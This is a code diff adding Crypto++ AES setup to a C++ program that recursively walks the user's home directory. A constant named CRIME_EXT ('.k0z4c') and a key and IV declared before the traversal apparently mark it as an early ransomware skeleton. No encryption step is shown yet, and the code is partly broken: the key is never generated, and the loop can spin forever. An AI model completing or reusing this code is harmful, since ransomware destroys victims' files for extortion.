@@ -1,3 +1,10 @@
+#include "cryptlib.h"
+#include "rijndael.h"
+#include "modes.h"
+#include "files.h"
+#include "osrng.h"
+#include "hex.h"
+
 #include<filesystem>
 #include<iostream>
 #include<list>
@@ -5,7 +12,10 @@
 #include<string>
 
 namespace fs = std::filesystem;
+using namespace CryptoPP;
 using namespace std;
+
+const char CRIME_EXT[] = ".k0z4c";
 
 auto printErr = [](const char* msg)
   { cout << "[x] " << msg << endl; };
@@ -42,18 +52,20 @@ typedef Node FsObj;
 int main(int argc, char** argv){
 
   fs::path entryPoint = getenv("HOME");
-  cout << entryPoint << endl;
   FsObj curr = FsObj(entryPoint);
-  
-  cout << "created a filesystem object" << endl;
-  
   queue<FsObj> q; q.push(curr);
   
-  cout << "Pushed !" << endl ; 
+
+  // let's init the fucking keys and a pseudo random number generator
+  AutoSeededRandomPool prng;
+  HexEncoder encoder(new FileSink(std::cout));
+  SecByteBlock key(AES::DEFAULT_KEYLENGTH);
+  SecByteBlock iv(AES::BLOCKSIZE);
+  
   while(!q.empty()){
-    cout << "the size of the queue " << q.size() << endl;
+    //cout << "the size of the queue " << q.size() << endl;
     curr = q.front();
-    cout << "extracted " << curr.value << endl;
+    //cout << "extracted " << curr.value << endl;
     if(curr.is_visited) continue;
     
     curr.is_visited = true;
@@ -62,4 +74,5 @@ int main(int argc, char** argv){
        q.push(link);
     q.pop();
   }
+  return 0;
 }
